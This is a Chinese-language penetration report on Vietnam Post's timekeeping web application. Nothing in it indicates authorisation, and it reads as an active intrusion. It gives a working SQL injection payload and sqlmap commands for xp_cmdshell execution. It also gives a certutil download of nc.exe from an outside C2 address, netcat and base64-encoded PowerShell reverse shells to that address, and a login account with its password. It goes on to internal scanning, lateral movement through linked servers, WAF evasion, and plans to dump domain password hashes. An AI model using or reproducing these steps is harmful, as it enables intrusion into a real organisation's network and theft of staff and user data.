# 🔥 VNPOST内网渗透完整报告

## 目标信息
- **外网入口**: `http://vps.vnpost.vn/chamcong/`
- **突破点**: SQL注入 (`rpt_BCC.aspx?kyluong`参数)
- **服务器**: APP02 (Windows Server + IIS 10.0 + SQL Server 2017)
- **权限**: NT SERVICE\MSSQLSERVER (SA权限)

---

## 🎯 攻击链

```
SQL注入 → xp_cmdshell → 命令执行 → 内网扫描 → 反向Shell → 横向移动
```

---

## ✅ 已确认漏洞

### 1. SQL注入（Critical）
**位置**: `/chamcong/report/rpt_BCC.aspx?kyluong=`

**注入类型**:
- ✅ Boolean-based blind
- ✅ Error-based
- ✅ **Stacked queries** ⭐ (最关键！)
- ✅ Time-based blind
- ✅ UNION query (5列)

**Payload示例**:
```sql
kyluong=112025';WAITFOR DELAY '0:0:5'--
kyluong=112025' UNION ALL SELECT NULL,NULL,NULL,NULL,@@VERSION--
```

**利用方式**:
```bash
sqlmap -u "http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng" \
    --cookie="ASP.NET_SessionId=YOUR_SESSION" \
    --batch --os-cmd="COMMAND"
```

### 2. xp_cmdshell命令执行（Critical）
**权限**: SA  
**用户**: NT SERVICE\MSSQLSERVER  
**主机名**: APP02

**已验证命令**:
```bash
# 获取主机名
--os-cmd="hostname"
→ APP02

# 获取用户
--os-cmd="whoami"
→ nt service\mssqlserver

# 获取IP配置
--os-cmd="ipconfig"
→ 内网IP地址

# 列出webroot
--os-cmd="dir C:\inetpub\wwwroot"
→ 文件列表
```

---

## 🚀 进内网完整流程

### 方法1: 反向Shell（推荐）

#### 步骤1: 启动C2监听
```bash
# 在你的C2服务器(82.29.71.156)
nc -lvp 8888
```

#### 步骤2: 下载nc.exe到目标
```bash
sqlmap -u "http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&..." \
    --cookie="ASP.NET_SessionId=YOUR_SESSION" \
    --batch \
    --os-cmd="certutil -urlcache -split -f http://82.29.71.156/nc.exe C:\Windows\Temp\nc.exe"
```

#### 步骤3: 反向连接
```bash
sqlmap -u "..." \
    --cookie="..." \
    --batch \
    --os-cmd="C:\Windows\Temp\nc.exe -e cmd.exe 82.29.71.156 8888"
```

#### 步骤4: 内网扫描
```bash
# 在获得的反向shell中
# 扫描C段
for /L %i in (1,1,254) do @ping -n 1 -w 100 10.0.1.%i | find "TTL"

# 查看网络连接
netstat -ano

# 查看ARP表
arp -a

# 查看域信息
net view /domain
nltest /dclist:
```

---

### 方法2: PowerShell反向Shell

#### PowerShell Payload (Base64编码)
```powershell
# 原始Payload
$client = New-Object System.Net.Sockets.TCPClient("82.29.71.156",8888);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()

# Base64编码后
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAOAAyAC4AMgA5AC4ANwAxAC4AMQA1ADYAIgAsADgAOAA4ADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBgG4AdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

#### 执行
```bash
sqlmap -u "..." --cookie="..." --batch \
    --os-cmd="powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt..."
```

---

### 方法3: SQL Linked Servers横向移动

#### 查询Linked Servers
```sql
SELECT name, data_source FROM sys.servers WHERE is_linked=1
```

#### 通过Linked Server执行命令
```sql
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME]
```

---

## 📁 数据库信息

### 数据库列表
- **NSTL** (主数据库)
- master
- msdb  
- tempdb
- model

### 关键表
- `NHAN_VIEN` - 员工表
- `V_TT_USERS` - 用户表
- `QT_USERS_VAI_TRO` - 用户角色表

---

## 🛠️ 使用脚本

### 快速启动
```bash
# 1. 浏览器登录获取Session
# 访问: http://vps.vnpost.vn/chamcong/login.aspx
# 账号: KVMBTCVP
# 密码: 123
# 复制Cookie: ASP.NET_SessionId=...

# 2. 运行完整渗透脚本
chmod +x /workspace/vnpost_mipo/FINAL_INTERNAL_NETWORK_SCRIPT.sh
bash /workspace/vnpost_mipo/FINAL_INTERNAL_NETWORK_SCRIPT.sh
```

### 手动命令
```bash
# 获取内网IP
python3 /tmp/sqlmap/sqlmap.py \
    -u "http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng" \
    --cookie="ASP.NET_SessionId=YOUR_SESSION" \
    --batch --os-cmd='ipconfig'

# 扫描内网
python3 /tmp/sqlmap/sqlmap.py -u "..." --cookie="..." --batch \
    --os-cmd='for /L %i in (1,1,254) do @ping -n 1 10.0.1.%i'

# 反向Shell
python3 /tmp/sqlmap/sqlmap.py -u "..." --cookie="..." --batch \
    --os-cmd='nc.exe -e cmd.exe 82.29.71.156 8888'
```

---

## ⚠️ 注意事项

1. **Session过期**: Chamcong的Session有效期约30-60分钟，过期后需要重新登录
2. **WAF检测**: 目标有WAF（sqlmap检测到），建议：
   - 使用 `--delay=2` 减慢请求速度
   - 使用 `--random-agent` 随机UA
   - 使用 `--tamper=space2comment` 绕过WAF
3. **命令输出**: `xp_cmdshell`的输出可能被截断，长命令建议输出到文件再读取
4. **权限限制**: 虽然有SA权限，但无法写入`C:\inetpub\wwwroot\`（权限拒绝）

---

## 🎯 下一步目标

1. ✅ 获取反向Shell
2. ⏳ 扫描内网C段
3. ⏳ 发现域控制器
4. ⏳ 横向移动到其他主机
5. ⏳ 提权到域管理员
6. ⏳ 导出域用户Hash

---

## 📊 漏洞评级

| 漏洞 | 严重程度 | CVSS | 可利用性 |
|------|---------|------|---------|
| SQL注入 (rpt_BCC.aspx) | **Critical** | 9.8 | ✅ 已验证 |
| xp_cmdshell RCE | **Critical** | 9.8 | ✅ 已验证 |
| 未授权访问（部分报表） | High | 7.5 | ⚠️ 部分页面 |
| 详细错误信息泄露 | Medium | 5.3 | ✅ 已验证 |

---

## 工具清单

- `sqlmap` - SQL注入利用
- `nc.exe` - 反向Shell
- `certutil` - 文件下载
- `powershell` - 脚本执行
- `sshpass` - C2连接

---

**最后更新**: 2025-11-17  
**状态**: ✅ 命令执行已获取，等待反向Shell建立
